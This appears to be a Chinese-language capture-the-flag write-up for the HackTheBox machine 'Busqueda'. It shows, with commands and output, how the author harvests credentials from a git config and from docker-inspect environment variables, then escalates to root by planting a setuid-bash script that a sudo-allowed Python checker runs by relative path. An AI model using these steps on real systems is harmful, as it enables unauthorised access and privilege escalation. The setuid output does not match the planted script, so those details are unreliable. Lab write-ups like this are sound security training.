<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>-l长格式信息,-a 所有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>

<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看下config和logs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>

<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
<p>关注下这串代码：</p>
<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
<p>尝试下cody后的东西作为密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#118;&#99;&#x40;&#x31;&#48;&#46;&#49;&#48;&#46;&#49;&#x31;&#x2e;&#50;&#48;&#56;">&#115;&#118;&#99;&#x40;&#x31;&#48;&#46;&#49;&#48;&#46;&#49;&#x31;&#x2e;&#50;&#48;&#56;</a>，ssh连接即可。</p>
<h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
<p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>之后的操作便是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls 有user.txt</span><br><span class="line"></span><br><span class="line">cd /</span><br><span class="line"></span><br><span class="line">ls   有etc文件夹</span><br><span class="line"></span><br><span class="line">cd etc</span><br><span class="line"></span><br><span class="line">ls ，看到了有apache2文件夹</span><br><span class="line"></span><br><span class="line">cd apache2</span><br><span class="line">svc@busqueda:/etc/apache2$ ls</span><br><span class="line">apache2.conf    conf-enabled  magic           mods-enabled  sites-available</span><br><span class="line">conf-available  envvars       mods-available  ports.conf    sites-enabled</span><br><span class="line">svc@busqueda:/etc/apache2$ cat  sites-available</span><br><span class="line"></span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -a</span><br><span class="line">.  ..  000-default.conf  default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr  4 16:08 .</span><br><span class="line">drwxr-xr-x 8 root root 4096 Apr  4 16:08 ..</span><br><span class="line">-rw-r--r-- 1 root root  837 Feb 20 14:06 000-default.conf</span><br><span class="line">-rw-r--r-- 1 root root 6338 Sep 30  2022 default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ cat 000-default.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:5000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:5000/</span><br><span class="line"></span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteCond %&#123;HTTP_HOST&#125; !^searcher.htb$</span><br><span class="line">        RewriteRule /.* http://searcher.htb/ [R]</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName gitea.searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:3000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:3000/</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了gitea.searcher.htb网址，尝试登录：http或https，或加上端口3000都不行，想到添加域名</p>
<p>切换到主机的终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">添加</span><br><span class="line">10.10.11.208 gitea.searcher.htb</span><br></pre></td></tr></table></figure>

<p>打开浏览器输入<a href="http://gitea.searcher.htb/">http://gitea.searcher.htb</a></p>
<p>点击右上角sign in 出现</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230606214158201.png"></p>
<p>先放一遍。</p>
<p>再次在svc用户界面下，</p>
<p>sudo -l，</p>
<p>关注以下操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)</span><br><span class="line"></span><br><span class="line">     docker-ps     : List running docker containers</span><br><span class="line">     docker-inspect : Inpect a certain docker container</span><br><span class="line">     full-checkup  : Run a full system checkup</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对这三个命令依次运行一下，</p>
<p><img src="/../../../Typora/img111/image-20230606222958314.png" alt="image-20230606222958314"></p>
<p>发现docker-inspect 需要配合 -f和容器名才有显示</p>
<p>doker-inspect官方说明得：</p>
<p><a href="https://docs.docker.com/engine/reference/commandline/inspect/">docs.docker.com&#x2F;engine&#x2F;reference&#x2F;commandline&#x2F;inspect&#x2F;</a></p>
<p><img src="/../../../Typora/img111/image-20230606223323788.png" alt="image-20230606223323788"></p>
<p>例子：</p>
<p><code>docker inspect --format=&#39;&#123;&#123;.LogPath&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p><code>docker inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; $INSTANCE_ID</code></p>
<p>已知在…docker-ps命令下得到容器ID为960873171e2e和f84a6b33fb5a</p>
<p>先看ID1的：</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; 960873171e2e</code>得：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ </span><br><span class="line">sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#x27;&#123;&#123;json .Config&#125;&#125;&#x27; 960873171e2e</span><br><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;22/tcp&quot;:&#123;&#125;,&quot;3000/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:&#123;&quot;/data&quot;:&#123;&#125;,&quot;/etc/localtime&quot;:&#123;&#125;,&quot;/etc/timezone&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有数据库信息为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>GITEA__database__USER&#x3D;gitea”,”GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh</p>
</blockquote>
<p>看下另一个ID的</p>
<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; f84a6b33fb5a</code></p>
<p>得到结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;3306/tcp&quot;:&#123;&#125;,&quot;33060/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;],&quot;Cmd&quot;:[&quot;mysqld&quot;],&quot;Image&quot;:&quot;mysql:8&quot;,&quot;Volumes&quot;:&#123;&quot;/var/lib/mysql&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;docker-entrypoint.sh&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;db&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“MYSQL_ROOT_PASSWORD&#x3D;jI86kGUuj87guWr3RyF”,”MYSQL_USER&#x3D;gitea”,”MYSQL_PASSWORD&#x3D;yuiu1hoiu4i5ho1uh”,”MYSQL_DATABASE&#x3D;gitea”</p>
</blockquote>
<p>好，进入gitea的登录页面，尝试administrator:yuiu1hoiu4i5ho1uh</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201649485.png"></p>
<p>点击左边的仓库，发现：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201740407.png"></p>
<p>查看第一行脚本：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230607201759588.png"></p>
<p>前三个脚本对应了，之前的三个命令。</p>
<p>查看第四个脚本内容，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]</span><br><span class="line"></span><br><span class="line">def run_command(arg_list):</span><br><span class="line">    r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">    if r.stderr:</span><br><span class="line">        output = r.stderr.decode()</span><br><span class="line">    else:</span><br><span class="line">        output = r.stdout.decode()</span><br><span class="line"></span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_action(action):</span><br><span class="line">    if action == &#x27;docker-inspect&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            _format = sys.argv[2]</span><br><span class="line">            if len(_format) == 0:</span><br><span class="line">                print(f&quot;Format can&#x27;t be empty&quot;)</span><br><span class="line">                exit(1)</span><br><span class="line">            container = sys.argv[3]</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]</span><br><span class="line">            print(run_command(arg_list)) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">        except IndexError:</span><br><span class="line">            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">    elif action == &#x27;docker-ps&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;ps&#x27;]</span><br><span class="line">            print(run_command(arg_list)) </span><br><span class="line">        </span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line"></span><br><span class="line">    elif action == &#x27;full-checkup&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;./full-checkup.sh&#x27;]</span><br><span class="line">            print(run_command(arg_list))</span><br><span class="line">            print(&#x27;[+] Done!&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        action = sys.argv[1]</span><br><span class="line">        if action in actions:</span><br><span class="line">            process_action(action)</span><br><span class="line">        else:</span><br><span class="line">            raise IndexError</span><br><span class="line"></span><br><span class="line">    except IndexError:</span><br><span class="line">        print(f&#x27;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        print(&#x27;     docker-ps     : List running docker containers&#x27;)</span><br><span class="line">        print(&#x27;     docker-inspect : Inpect a certain docker container&#x27;)</span><br><span class="line">        print(&#x27;     full-checkup  : Run a full system checkup&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        exit(1)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>   elif action &#x3D;&#x3D; ‘full-checkup’:<br>       try:<br>           arg_list &#x3D; [‘.&#x2F;full-checkup.sh’]<br>           print(run_command(arg_list))<br>           print(‘[+] Done!’)<br>       except:<br>           print(‘Something went wrong’)<br>           exit(1)</p>
</blockquote>
<p>得：所读取路径不是绝对路径，它在当前目录下找full-checkup.sh的，如果在用户界面中非&#x2F;opt&#x2F;scripts&#x2F;位置下，就会出现报错。</p>
<p>vim full-checkup.sh，内容为：</p>
<blockquote>
<p>#!&#x2F;bin&#x2F;bash<br>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash<br>chmod +s &#x2F;tmp&#x2F;bash</p>
</blockquote>
<p>这段脚本的作用是创建了一个具有Setuid权限的”&#x2F;tmp&#x2F;bash”文件。通过设置Setuid权限，任何以该文件执行的用户都会暂时获得文件所有者（通常为root）的权限。这意味着，当普通用户执行”&#x2F;tmp&#x2F;bash”时，它将以root用户的权限执行，从而实现了权限提升。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ pwd</span><br><span class="line">/home/svc</span><br><span class="line">-bash-5.1$ vim full-checkup.sh</span><br><span class="line">-bash-5.1$ chmod +x full-checkup.sh</span><br><span class="line">-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br><span class="line">[sudo] password for svc: </span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ ls -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash</span><br><span class="line"></span><br><span class="line">成功给 /bin/bash 带上suid提权成功</span><br><span class="line">-bash-5.1$ /bin/bash -p</span><br><span class="line">bash-5.1# whoami</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-5.1# cd /root</span><br><span class="line">bash-5.1# ls -la</span><br><span class="line">total 60</span><br><span class="line">drwx------  9 root root 4096 Apr  3 16:01 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .cache</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .config</span><br><span class="line">-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js</span><br><span class="line">-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  1 10:46 .local</span><br><span class="line">-rw-------  1 root root   50 Feb 20 12:04 .my.cnf</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/null</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm</span><br><span class="line">drwxr-xr-x  5 root root 4096 Jun  7 04:20 .pm2</span><br><span class="line">-rw-r--r--  1 root root  161 Jul  9  2019 .profile</span><br><span class="line">-rw-r-----  1 root root   33 Jun  7 04:20 root.txt</span><br><span class="line">drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 snap</span><br><span class="line">bash-5.1# cat root.txt</span><br><span class="line">105666c0b97b4202de7dabf892feb190</span><br><span class="line">bash-5.1# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>跟随大佬的wp思路进行，达到提权的目的。</p>
<p>1.nmap扫到端口为80，与22</p>
<p>2.访问80端口位置，进行反弹shell。</p>
<p>3.遍历各文件夹，找到敏感信息</p>
<p>4.拿到普通用户的账号和密码，尝试22端口的ssh连接。</p>
<p>5.由普通用户进行提权。</p>
<p>其中有很多细节有待细究，值得复盘。</p>
